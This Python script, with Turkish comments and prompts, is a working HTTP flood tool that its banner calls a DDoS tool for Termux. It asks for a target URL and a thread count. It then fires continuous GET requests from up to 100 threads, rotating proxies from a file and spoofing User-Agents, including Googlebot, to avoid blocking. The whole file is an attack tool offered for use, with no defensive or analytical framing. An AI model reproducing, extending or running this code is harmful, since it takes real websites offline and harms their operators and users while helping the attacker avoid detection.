import os
import sys
import time
import random
import threading
import requests
from datetime import datetime

# Renkli çıktılar
class colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Banner
def show_banner():
    os.system('clear')
    print(f"""{colors.HEADER}
    ██╗     ██╗██╗  ██╗ █████╗     ██████╗ ██████╗ ██████╗ ██╗   ██╗
    ██║     ██║██║  ██║██╔══██╗    ██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
    ██║     ██║███████║███████║    ██║  ██║██████╔╝██║  ██║ ╚████╔╝ 
    ██║     ██║██╔══██║██╔══██║    ██║  ██║██╔══██╗██║  ██║  ╚██╔╝  
    ███████╗██║██║  ██║██║  ██║    ██████╔╝██║  ██║██████╔╝   ██║   
    ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═════╝    ╚═╝   
    {colors.CYAN}
    Lukha tarafından Termux için DDoS Aracı v3.0
    {colors.YELLOW}Developer: @Lukhaskr | Toplum için mücadele!
    {colors.RESET}""")

# Proxy yükleme
def load_proxies():
    proxies = []
    try:
        with open('proxy.txt', 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    proxies.append({
                        'http': f'http://{line}',
                        'https': f'http://{line}'
                    })
        if not proxies:
            print(f"{colors.YELLOW}[!] proxy.txt boş, direkt bağlantı kullanılacak{colors.RESET}")
            return None
        return proxies
    except FileNotFoundError:
        print(f"{colors.YELLOW}[!] proxy.txt bulunamadı, direkt bağlantı kullanılacak{colors.RESET}")
        return None

# Saldırı fonksiyonu
def attack(target, thread_id, proxies, user_agents):
    while not stop_flag:
        try:
            proxy = random.choice(proxies) if proxies else None
            headers = {'User-Agent': random.choice(user_agents)}
            
            start_time = time.time()
            response = requests.get(
                target,
                proxies=proxy,
                headers=headers,
                timeout=5
            )
            latency = int((time.time() - start_time) * 1000)
            
            if response.status_code == 200:
                print(f"{colors.GREEN}[+] Thread-{thread_id} {proxy['http'] if proxy else 'DIRECT'} → {latency}ms {datetime.now().strftime('%H:%M:%S')}{colors.RESET}")
            else:
                print(f"{colors.YELLOW}[!] Thread-{thread_id} Code {response.status_code} {datetime.now().strftime('%H:%M:%S')}{colors.RESET}")
                
        except Exception as e:
            print(f"{colors.RED}[-] Thread-{thread_id} Error: {str(e)[:50]}{colors.RESET}")
            time.sleep(1)

# Ana program
def main():
    global stop_flag
    stop_flag = False
    
    show_banner()
    
    # Ayarlar
    target_url = input(f"{colors.BLUE}[?] Hedef URL: {colors.RESET}").strip()
    thread_count = int(input(f"{colors.BLUE}[?] Thread Sayısı (1-100): {colors.RESET}") or 50)
    
    # Proxy ve User-Agent yükle
    proxies = load_proxies()
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
        "Googlebot/2.1 (+http://www.google.com/bot.html)"
    ]
    
    # Saldırıyı başlat
    print(f"\n{colors.CYAN}[!] {thread_count} thread ile saldırı başlatılıyor...{colors.RESET}")
    print(f"{colors.CYAN}[!] Durdurmak için CTRL+C{colors.RESET}\n")
    
    threads = []
    for i in range(thread_count):
        t = threading.Thread(
            target=attack,
            args=(target_url, i+1, proxies, user_agents),
            daemon=True
        )
        threads.append(t)
        t.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_flag = True
        print(f"\n{colors.RED}[!] Saldırı durduruluyor...{colors.RESET}")
        
        for t in threads:
            t.join(1)
        
        print(f"\n{colors.GREEN}[+] Lila için mücadele sona erdi!{colors.RESET}")
        sys.exit(0)

if __name__ == "__main__":
    main()
